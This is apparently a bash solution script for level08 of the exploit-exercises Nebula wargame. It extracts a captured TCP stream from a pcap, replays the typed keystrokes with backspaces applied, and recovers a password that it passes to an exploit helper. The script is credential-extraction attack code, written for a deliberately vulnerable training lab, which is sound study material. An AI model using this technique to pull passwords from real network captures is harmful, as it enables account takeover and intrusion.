#!/bin/bash -eu
# Copyright (c) 2015, Heye Voecking <heye.voecking+exploit-exercises.com@gmail.com>

source $HOME/common/setup-exploit

TOKEN=$(
  SRC_IP=059.233.235.218
  tcpflow -r /home/flag08/capture.pcap src $SRC_IP

  # Simulate keyboard input (only backspace and enter are needed)
  BACKSPACE=0
  for B in $(cat $SRC_IP* | xxd -p -c 1 | tac)
  do
    if [[ $B == 7f ]]
    then
      BACKSPACE=$(( $BACKSPACE + 1 ))
    else
      if [[ $BACKSPACE != 0 ]]
      then
        BACKSPACE=$(( $BACKSPACE - 1 ))
      else
        if [[ $B == 0d ]]
        then
          echo
        else
          echo -n $B
        fi
      fi
    fi
  done | head -2 | tail -1 | tac -r -s ".." | xxd -p -r
)

exploit_with_token $TOKEN
